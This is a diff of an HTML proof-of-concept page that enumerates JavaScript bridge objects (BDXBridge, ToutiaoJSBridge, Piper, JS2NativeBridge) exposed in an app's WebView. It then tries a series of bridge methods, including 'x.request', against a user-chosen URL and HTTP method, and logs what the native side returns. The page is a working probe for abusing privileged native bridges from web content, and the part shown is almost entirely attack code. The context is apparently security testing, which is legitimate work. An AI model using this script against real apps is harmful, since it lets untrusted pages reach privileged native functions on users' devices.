@@ -27,74 +27,163 @@
   <h4>Result</h4>
   <pre id="log"></pre>
 
-  <script>
-    function log(msg) {
-      const el = document.getElementById('log');
-      el.textContent += (typeof msg === 'string' ? msg : JSON.stringify(msg, null, 2)) + '\n';
+<script>
+  function log(msg) {
+    const el = document.getElementById('log');
+    el.textContent += (typeof msg === 'string' ? msg : JSON.stringify(msg, null, 2)) + '\n';
+  }
+
+  function safeKeys(obj) {
+    if (!obj) return [];
+    const keys = new Set();
+    let cur = obj;
+    while (cur && cur !== Object.prototype) {
+      try {
+        Object.getOwnPropertyNames(cur).forEach(k => keys.add(k));
+      } catch (e) {}
+      cur = Object.getPrototypeOf(cur);
     }
+    return Array.from(keys).sort();
+  }
 
-    function bridgeKeys() {
-      return Object.keys(window).filter(k => /bridge|piper|jsb|toutiao|native/i.test(k));
-    }
+  function bridgeKeys() {
+    return Object.keys(window).filter(k => /bridge|piper|jsb|toutiao|native|bdx/i.test(k));
+  }
 
-    function tryCallBridge(method, params, callback) {
-      const candidates = [
-        ['ToutiaoJSBridge.call', () => window.ToutiaoJSBridge && window.ToutiaoJSBridge.call && window.ToutiaoJSBridge.call(method, params, callback)],
-        ['ToutiaoJSBridge.invokeMethod', () => window.ToutiaoJSBridge && window.ToutiaoJSBridge.invokeMethod && window.ToutiaoJSBridge.invokeMethod(method, params, callback)],
-        ['Piper.invoke', () => window.Piper && window.Piper.invoke && window.Piper.invoke(method, params, callback)],
-        ['JSBridge.call', () => window.JSBridge && window.JSBridge.call && window.JSBridge.call(method, params, callback)],
-        ['WebViewJavascriptBridge.callHandler', () => window.WebViewJavascriptBridge && window.WebViewJavascriptBridge.callHandler && window.WebViewJavascriptBridge.callHandler(method, params, callback)]
-      ];
+  function dumpBridgeObject(name) {
+    const obj = window[name];
+    log('==== ' + name + ' ====');
+    log('type: ' + typeof obj);
+    log(safeKeys(obj));
+  }
 
-      for (const [name, fn] of candidates) {
-        try {
-          const ret = fn();
-          if (ret !== undefined) return name;
-        } catch (e) {
-          log(name + ' error: ' + e.message);
-        }
+  function buildParams() {
+    return {
+      url: document.getElementById('targetUrl').value,
+      method: document.getElementById('method').value
+    };
+  }
+
+  function tryCall(name, fn) {
+    try {
+      const ok = fn();
+      if (ok) {
+        log('Used bridge API: ' + name);
+        return true;
       }
-      return null;
+    } catch (e) {
+      log(name + ' error: ' + e.message);
     }
+    return false;
+  }
 
-    function runPoC() {
-      document.getElementById('log').textContent = '';
+  function runPoC() {
+    document.getElementById('log').textContent = '';
 
-      const method = document.getElementById('jsbName').value;
-      const params = {
-        url: document.getElementById('targetUrl').value,
-        method: document.getElementById('method').value
-      };
+    const method = document.getElementById('jsbName').value || 'request';
+    const params = buildParams();
 
-      log('Page URL: ' + location.href);
-      log('Bridge keys:');
-      log(bridgeKeys());
-      log('Calling: ' + method);
-      log(params);
+    log('Page URL: ' + location.href);
+    log('Bridge keys:');
+    log(bridgeKeys());
 
-      const used = tryCallBridge(method, params, function(res) {
-        log('Callback result:');
-        log(res);
-      });
+    dumpBridgeObject('BDXBridge');
+    dumpBridgeObject('JS2NativeBridge');
+    dumpBridgeObject('ToutiaoJSBridge');
+    dumpBridgeObject('Piper');
 
-      if (used) {
-        log('Used: ' + used);
-      } else {
-        log('No known bridge API found.');
+    log('Calling: ' + method);
+    log(params);
+
+    const callback = function(res) {
+      log('Callback result:');
+      log(res);
+    };
+
+    const candidates = [
+      ['BDXBridge.call', function() {
+        return window.BDXBridge &&
+          typeof window.BDXBridge.call === 'function' &&
+          (window.BDXBridge.call(method, params, callback), true);
+      }],
+
+      ['BDXBridge.invoke', function() {
+        return window.BDXBridge &&
+          typeof window.BDXBridge.invoke === 'function' &&
+          (window.BDXBridge.invoke(method, params, callback), true);
+      }],
+
+      ['BDXBridge.callHandler', function() {
+        return window.BDXBridge &&
+          typeof window.BDXBridge.callHandler === 'function' &&
+          (window.BDXBridge.callHandler(method, params, callback), true);
+      }],
+
+      ['BDXBridge.send', function() {
+        return window.BDXBridge &&
+          typeof window.BDXBridge.send === 'function' &&
+          (window.BDXBridge.send(method, params, callback), true);
+      }],
+
+      ['BDXBridge.call x.request', function() {
+        return window.BDXBridge &&
+          typeof window.BDXBridge.call === 'function' &&
+          (window.BDXBridge.call('x.request', params, callback), true);
+      }],
+
+      ['BDXBridge.invoke x.request', function() {
+        return window.BDXBridge &&
+          typeof window.BDXBridge.invoke === 'function' &&
+          (window.BDXBridge.invoke('x.request', params, callback), true);
+      }],
+
+      ['ToutiaoJSBridge.call', function() {
+        return window.ToutiaoJSBridge &&
+          typeof window.ToutiaoJSBridge.call === 'function' &&
+          (window.ToutiaoJSBridge.call(method, params, callback), true);
+      }],
+
+      ['ToutiaoJSBridge.invokeMethod', function() {
+        return window.ToutiaoJSBridge &&
+          typeof window.ToutiaoJSBridge.invokeMethod === 'function' &&
+          (window.ToutiaoJSBridge.invokeMethod(method, params, callback), true);
+      }],
+
+      ['Piper.invoke', function() {
+        return window.Piper &&
+          typeof window.Piper.invoke === 'function' &&
+          (window.Piper.invoke(method, params, callback), true);
+      }]
+    ];
+
+    for (const item of candidates) {
+      if (tryCall(item[0], item[1])) {
+        return;
       }
     }
 
-    document.addEventListener('DOMContentLoaded', function() {
-      log('DOM loaded.');
-      log('Bridge keys:');
-      log(bridgeKeys());
-    });
+    log('No callable bridge API matched.');
+  }
 
-    document.addEventListener('ToutiaoJSBridgeReady', function() {
-      log('ToutiaoJSBridgeReady fired.');
-      log('Bridge keys:');
-      log(bridgeKeys());
-    });
-  </script>
+  document.addEventListener('DOMContentLoaded', function() {
+    log('DOM loaded.');
+    log('Bridge keys:');
+    log(bridgeKeys());
+    dumpBridgeObject('BDXBridge');
+    dumpBridgeObject('JS2NativeBridge');
+  });
+
+  document.addEventListener('ToutiaoJSBridgeReady', function() {
+    log('ToutiaoJSBridgeReady fired.');
+    log('Bridge keys:');
+    log(bridgeKeys());
+  });
+
+  document.addEventListener('BDXBridgeReady', function() {
+    log('BDXBridgeReady fired.');
+    log('Bridge keys:');
+    log(bridgeKeys());
+  });
+</script>
 </body>
 </html>
